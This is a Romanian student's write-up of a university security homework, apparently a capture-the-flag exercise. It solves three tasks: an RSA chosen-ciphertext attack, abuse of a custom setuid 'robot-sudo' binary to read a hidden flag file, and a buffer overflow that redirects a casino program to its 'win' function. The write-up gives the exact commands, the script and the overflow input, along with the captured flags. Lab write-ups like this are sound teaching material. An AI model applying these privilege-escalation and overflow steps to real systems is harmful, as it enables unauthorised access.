# TEMA 1 ISC -> ANCA-MARIA COLACEL

**Tema contine 3 taskuri. Le voi detalia pe fiecare in parte.**

## TASK1 - CRYPTO-ATTACK
In vederea rezolvarii acestui exercitiu a fost necesara completarea scriptului pus la dispozitie in arhiva.
Am inceput cu hinturile puse la dispozitie in cerinta si decodand din base64 KLT vahlxg vbiaxkmxqm tmmtvd am vazut ca se foloseste RSA chosen chiper attack. Celalalt nu era util :)
Am incercat sa decodez message.txt din b64 si am obtinut un json cu 3 campuri, n, e si flag, astfel am format chiper_dash-ul necesar algoritmului in urma aplicarii formulei. M-am gandit ca formatul in care trebuie trimise informatiile la server este tot json astfel ca formez noul json folosind chiper_dash-ul, l-am codat si l-am trimis la server. Salvez raspunsul de la server, folosesc decode-unicode si apoi fac conversie din string in numar pt ca potrivit algoritmului trebuie sa impart la numarul random. Dupa ce fac impartirea practic obtin flagul dar in format numeric asa ca il convertesc in string si il printez. 
### FLAG: SpeishFlag{DCUuhc0WShG69E0H7kF6V2LIxLu7O2gi}

## TASK2 - LINUX ACL
 1) In primul rand ma conectez la userul janitor cu ssh.
    
    ```ssh -i id_rsa janitor@isc2023.1337.cx```

2) Dau urmatoarea comanda si gasesc fisierul hints.txt la calea /var/.hints.txt.

   ```find /var -type f -exec grep -l 'hints' {} +```
   
   Dau cat pe fisier si obtin:

   ```
   Here's more hints:
   - No ideas? Try to ltrace the setuid binaries!
   - Try to find the hidden config directory ;)
   - How does that custom sudo binary match the allowed command? How about its
    arguments?
   - You can add scripts to the same dir as sudo-permitted ones, but you cannot
    delete/modify them due to sticky bit :P

   ```

  3) Dupa ce ma uit prin fisiere observ ca de interes este fisierul robo-sudo acesta avand userul wallybot

   ```
   janitor@fhunt:/usr/local/bin$ ls -la         
   total 48
   drwxrwxr-t+ 1 root     root     4096 Dec  7 16:01 .
   drwxr-xr-x  1 root     root     4096 Oct  3 02:03 ..
   -rwxr-xr-x  1 janitor  janitor    74 Apr 10  2022 janitor-coffee.sh
   -rwxr-xr-x  1 janitor  janitor   228 Apr 10  2022 janitor-vacuum.sh
   -rwsr-xr-x  1 wallybot zboss   17408 Dec  7 16:01 robot-sudo
   -rwxr-xr-x  1 root     root      163 Apr 10  2022 vacuum-control

   ```

Dau strings pe robot-sudo si gasesc 
```

Please supply a command as argument!
Unable to determine current user! Exiting...
Hey, no shell injection please!
Invalid command given!
/.you.are.never/.gonnafindthis/r0b0t3rs.conf

```
deci am gasit fisierul cu permisiuni si din acesta gasesc regulile: 

```
allow wallybot /opt/.wellhidden/0b3y.b0ss
allow janitor /usr/local/bin/vacuum-control

```

Ca sa pot gasi flagul trebuie sa ma folosesc de /usr/local/bin/vacuum-control. 
Ma uit in /opt/.wellhidden/0b3y.b0ss unde gasesc de interes **ad002825749349601baafd654b5406e2Access denied!
I will contact you when I require your cleaning services, janitor!
Congratulations, here's your flag:cat /etc/opt/something/here.bin/.xyzflag**.
M-am gandit sa folosesc tokenul acesta

```
janitor@fhunt:/usr/local/bin$  /opt/.wellhidden/0b3y.b0ss ad002825749349601baafd654b5406e2
I will contact you when I require your cleaning services, janitor!

```

si am primit asta. 

4) Folosesc /usr/local/bin/vacuum-control in /usr/local/bin/vacuum-control-v1 si fac urmatoarea modifacare ca sa pot gasi flagul

```

`janitor@fhunt:/usr/local/bin$ cat vacuum-control-v1 
#!/bin/bash

if [[ $EUID -lt 7000 ]]; then
    echo "ERROR: Access denied!"
    exit 1
fi

/opt/.wellhidden/0b3y.b0ss ad002825749349601baafd654b5406e2
cat /etc/opt/something/here.bin/.xyzflag

the rest of its implementation omitted / not important

janitor@fhunt:/usr/local/bin$ robot-sudo /usr/local/bin/vacuum-control-v1 /opt/.wellhidden/0b3y.b0ss ad002825749349601baafd654b5406e2
Congratulations, here's your flag:
SpeishFlag{RpBElwNQrhVrrYLolrkLrTOXtOQgZJWL}``

```

Am  modificat in script apoi am rulat ca si robot-sudo si am obtinut flagul.

### FLAG: SpeishFlag{RpBElwNQrhVrrYLolrkLrTOXtOQgZJWL}

## TASK3 - BINNARY-EXPLOIT

Ma folosesc de Ghidra ca sa deschid binarul si sa vizualizez codul in c pentru main.c, loop.c si win.c. Din main se intra in loop dar nu se intra si in win, ceea ce eu vreau sa se intample pentru a gasi flagul, astfel ca ceea ce vreau este sa suprascriu adresa de retur din loop ca sa ii dau adresa lui win. Aflu adresa folosind: 
```
objdump -t casino | grep win

```

Vreau sa fac buffer overflow si uitandu-ma cu objdump constat ca am nevoie de 37 de caractere de garbage la care adaug adresa pe care o convertesc din hexa in decimal plus inca un 0 si apoi lucky number si x ca sa intru pe conditia cu flagul.

```
student@uso:~/Desktop/AN_3/ISC/anca_maria.colacel/binary-exploit$ ./casino
Welcome to the Saint Tropez Virtual Casino!
Please enter your name:
anca
Welcome, anca!
Your balance: $655

Please enter the list of numbers you want to roll (write 'x' to stop): 
123 x
You got: 0 out of 1
Remaining balance: $554
Continue? [Y/n]y

Here's your lucky number: 141805

Please enter the list of numbers you want to roll (write 'x' to stop): 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134517302 0 141805 x            
You got: 1 out of 40
Remaining balance: $454
Continue? [Y/n]n
KThxBye!
File opening failed!
Note: there is no flag available locally, try it on the remote server!

```

Acesta este outputul obtinut in urma rularii pe local dupa care ma conectez la server folosind comanda

```
netcat  isc2023.1337.cx 10011

```

si pasii sunt aceiasi ca pe local dar la final se obtine flagul.

### FLAG: SpeishFlag{dTWwdiGKa7iyKqPYJG9rpyxMK06WcjM8}



   
   
    
 
  

